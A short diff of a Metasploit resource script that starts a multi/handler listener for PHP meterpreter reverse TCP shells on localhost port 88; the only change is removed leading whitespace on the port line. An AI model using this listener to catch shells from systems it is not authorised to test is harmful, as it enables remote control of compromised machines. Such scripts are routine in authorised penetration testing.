@@ -1,6 +1,6 @@
 use multi/handler
 set payload php/meterpreter/reverse_tcp
 set LHOST localhost
- set LPORT 88
+set LPORT 88
 set ExitOnSession false
 exploit -j
